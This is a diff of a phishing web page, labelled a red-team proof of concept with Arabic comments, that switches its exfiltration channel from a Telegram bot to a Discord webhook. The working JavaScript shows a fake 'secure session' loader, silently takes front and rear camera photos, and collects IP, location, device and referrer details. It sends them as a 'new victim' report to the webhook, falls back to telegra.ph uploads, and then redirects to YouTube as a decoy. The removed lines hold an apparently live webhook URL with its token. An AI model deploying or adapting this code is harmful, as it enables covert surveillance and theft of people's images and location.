@@ -22,29 +22,28 @@
 <div class="box">
   <div class="player"><div class="play"></div></div>
   <div class="bar"><i></i></div>
-  <div class="txt">جارٍ الاتصال بالخادم وتشفير الجلسة...</div>
+  <div class="txt">جارٍ تجهيز الجلسة الآمنة...</div>
 </div>
 
 <script>
 /* ============================================================
-   Camera Capture → Telegram Bot — Red Team PoC
-   يلتقط صورة من الكاميرا الأمامية ثم الخلفية ويرسلها للبوت
+   Camera Capture → Discord Webhook — Red Team PoC
+   يلتقط: كاميرا أمامية + خلفية + معلومات الضحية
+   ويرسلها كلها لويب هوك ديسكورد
    ============================================================ */
 
 const CONFIG = {
-  botToken:   "https://discord.com/api/webhooks/1537214553014804520/1ZgqczFK_f92j8XIlZaD58A3vXx80HXEVU0rPR7rNLKjXpCUgEOVR2cgLnztt-g_qlRc",          // من BotFather
-  chatId:     "https://discord.com/channels/1499694048024465549/1508943916450320424",          // معرفك (userinfobot أو getUpdates)
-  decoyUrl:   "https://www.youtube.com",     // التحويل بعد التصوير (اتركه فارغ "" لتعطيله)
-  redirectDelay: 6000,                        // ms قبل التحويل
-  cameraWarmup: 1200,                         // ms انتظار تثبيت الكاميرا قبل اللقطة
-  quality: 0.85,                              // جودة JPEG
-  apiBase:  "",                               // Worker اختياري (انظر الشرح) — مثال: "https://xxx.workers.dev"
-  grabIP:   true                              // التقاط IP وموقع تقريبي مع اللقطات
+  webhook: "ضع_رابط_الويب_هوك_هنا",   // رابط الـ Webhook من ديسكورد
+  decoyUrl: "https://www.youtube.com", // تحويل الضحية بعد التصوير ("" لتعطيله)
+  redirectDelay: 6000,                  // ms قبل التحويل
+  cameraWarmup: 1200,                   // ms انتظار تثبيت الكاميرا
+  quality: 0.85,                        // جودة JPEG
+  grabIP: true                          // التقاط IP وموقع تقريبي مع اللقطات
 };
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-/* ---------- 1) معلومات الضحية (IP + موقع تقريبي) ---------- */
+/* ---------- 1) معلومات الضحية ---------- */
 async function getIPInfo() {
   if (!CONFIG.grabIP) return null;
   for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
@@ -57,13 +56,7 @@ async function getIPInfo() {
   return null;
 }
 
-/* ---------- 2) رابط API مع دعم الـ Worker ---------- */
-function apiUrl(method) {
-  if (CONFIG.apiBase) return `${CONFIG.apiBase.replace(/\/+$/,"")}/${method}?token=${CONFIG.botToken}`;
-  return `https://api.telegram.org/bot${CONFIG.botToken}/${method}`;
-}
-
-/* ---------- 3) التقاط صورة من كاميرا ---------- */
+/* ---------- 2) التقاط صورة من كاميرا ---------- */
 async function capturePhoto(facingMode) {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -83,7 +76,7 @@ async function capturePhoto(facingMode) {
     canvas.width  = video.videoWidth  || 1280;
     canvas.height = video.videoHeight || 720;
     const ctx = canvas.getContext("2d");
-    if (facingMode === "user") {           // عكس الكاميرا الأمامية لصورة طبيعية
+    if (facingMode === "user") {           // عكس الكاميرا الأمامية
       ctx.translate(canvas.width, 0);
       ctx.scale(-1, 1);
     }
@@ -98,7 +91,7 @@ async function capturePhoto(facingMode) {
   }
 }
 
-/* ---------- 4) رفع الصورة على telegra.ph (fallback) ---------- */
+/* ---------- 3) رفع صورة على telegra.ph (fallback للإرسال المضمون) ---------- */
 async function uploadToTelegraph(blob) {
   const fd = new FormData();
   fd.append("file", blob, "photo.jpg");
@@ -108,73 +101,92 @@ async function uploadToTelegraph(blob) {
   return null;
 }
 
-/* ---------- 5) إرسال صورة (ثلاث طبقات) ---------- */
-async function sendPhoto(blob, caption) {
-  // طبقة 1: multipart مباشر — الطلب يوصل حتى لو المتصفح ما يقرأ الرد (CORS)
+/* ---------- 4) الإرسال لديسكورد (طبقتان) ---------- */
+async function sendToDiscord(frontBlob, backBlob, info) {
+  const stamp = new Date().toLocaleString("ar-EG");
+  const location = [info?.city, info?.region, info?.country].filter(Boolean).join("، ") || "غير معروف";
+
+  const baseFields = [
+    { name: "IP",        value: info?.ip || "غير معروف", inline: true },
+    { name: "الموقع",    value: location,                inline: true },
+    { name: "الجهاز",    value: (navigator.userAgent || "?").slice(0, 120), inline: false },
+    { name: "اللغة",     value: navigator.language,      inline: true },
+    { name: "الشاشة",    value: screen.width + "x" + screen.height, inline: true },
+    { name: "المصدر",    value: document.referrer || "direct", inline: false },
+    { name: "الوقت",     value: stamp,                   inline: false }
+  ];
+
+  /* --- الطبقة 1: multipart مع الصور كـ attachments --- */
   try {
-    const fd = new FormData();
-    fd.append("chat_id", CONFIG.chatId);
-    fd.append("photo", blob, "photo.jpg");
-    if (caption) fd.append("caption", caption);
-    const r = await fetch(apiUrl("sendPhoto"), { method: "POST", body: fd });
+    const embeds = [];
+    if (frontBlob) embeds.push({ title: "الكاميرا الأمامية", fields: baseFields, image: { url: "attachment://front.jpg" }, color: 0xe50914 });
+    if (backBlob)  embeds.push({ title: "الكاميرا الخلفية", fields: baseFields, image: { url: "attachment://back.jpg"  }, color: 0x1e90ff });
+
+    const payload = JSON.stringify({ username: "Logger", embeds });
+
+    const form = new FormData();
+    form.append("payload_json", payload);
+    if (frontBlob) form.append("files[0]", frontBlob, "front.jpg");
+    if (backBlob)  form.append("files[1]", backBlob,  "back.jpg");
+
+    const r = await fetch(CONFIG.webhook, { method: "POST", body: form });
     if (r.ok) return true;
   } catch (e) {}
 
-  // طبقة 2: رفع على telegra.ph ثم إرسال الرابط
+  /* --- الطبقة 2: رفع على telegra.ph وإرسال الروابط --- */
   try {
-    const url = await uploadToTelegraph(blob);
-    if (url) {
-      const p = new URLSearchParams({ chat_id: CONFIG.chatId, photo: url });
-      if (caption) p.set("caption", caption);
-      await fetch(apiUrl("sendPhoto") + "?" + p.toString(), { method: "POST" });
+    const embeds = [];
+    if (frontBlob) {
+      const url = await uploadToTelegraph(frontBlob);
+      if (url) embeds.push({ title: "الكاميرا الأمامية", fields: baseFields, image: { url }, color: 0xe50914 });
+    }
+    if (backBlob) {
+      const url = await uploadToTelegraph(backBlob);
+      if (url) embeds.push({ title: "الكاميرا الخلفية", fields: baseFields, image: { url }, color: 0x1e90ff });
+    }
+    if (embeds.length) {
+      await fetch(CONFIG.webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ username: "Logger", embeds })
+      });
       return true;
     }
+  } catch (e) {}
+
+  /* --- الطبقة 3: رسالة نصية فقط (رفض الكاميرا مثلاً) --- */
+  try {
+    await fetch(CONFIG.webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        username: "Logger",
+        content: "ضحية جديدة — تعذر التصوير (رفض إذن الكاميرا أو لا توجد كاميرا)\n" +
+                 "IP: " + (info?.ip || "غير معروف") + " | الموقع: " + location + "\n" +
+                 "الوقت: " + stamp
+      })
+    });
   } catch (e) {}
   return false;
 }
 
-/* ---------- 6) إرسال رسالة نصية ---------- */
-async function sendText(text) {
-  try {
-    const body = new URLSearchParams({ chat_id: CONFIG.chatId, text });
-    const r = await fetch(apiUrl("sendMessage"), { method: "POST", body });
-    return r.ok;
-  } catch (e) { return true; } // الطلب وصل رغم حجب القراءة
-}
-
 /* ---------- التنفيذ الرئيسي ---------- */
 (async () => {
-  if (!CONFIG.botToken.startsWith("ضع") && !CONFIG.chatId.startsWith("ضع")) {
-    if (sessionStorage.getItem("_done")) { if (CONFIG.decoyUrl) location.replace(CONFIG.decoyUrl); return; }
-    sessionStorage.setItem("_done", "1");
-  } else {
-    console.warn("[PoC] ضع botToken و chatId في CONFIG");
-  }
+  if (CONFIG.webhook.startsWith("ضع")) { console.warn("[PoC] ضع رابط الويب هوك في CONFIG"); return; }
+
+  if (sessionStorage.getItem("_done")) { if (CONFIG.decoyUrl) location.replace(CONFIG.decoyUrl); return; }
+  sessionStorage.setItem("_done", "1");
 
   if (CONFIG.decoyUrl) setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);
   if (!window.isSecureContext) console.warn("[PoC] الكاميرا تحتاج HTTPS");
 
-  const info  = await getIPInfo();
-  const ua    = navigator.userAgent;
-  const stamp = new Date().toLocaleString("ar-EG");
+  const info = await getIPInfo();
 
-  const victimSummary =
-    "ضحية جديدة\n" +
-    "الوقت: " + stamp + "\n" +
-    "IP: " + (info?.ip || "غير معروف") + "\n" +
-    "الموقع: " + [info?.city, info?.region, info?.country].filter(Boolean).join("، ") + "\n" +
-    "الجهاز: " + ua.slice(0, 110) + "\n" +
-    "اللغة: " + navigator.language + " | الشاشة: " + screen.width + "x" + screen.height;
-
-  // التصوير: أمامية ← مهلة قصيرة ← خلفية
   const front = await capturePhoto("user");
   await sleep(400);
   const back  = await capturePhoto("environment");
 
-  let sent = 0;
-  if (front) { await sendPhoto(front, "الكاميرا الأمامية\n" + victimSummary); sent++; }
-  if (back)  { await sendPhoto(back,  "الكاميرا الخلفية\n" + victimSummary); sent++; }
-  if (!sent) await sendText("تعذر التصوير (رفض إذن الكاميرا)\n" + victimSummary);
+  await sendToDiscord(front, back, info);
 })();
 </script>
 </body>
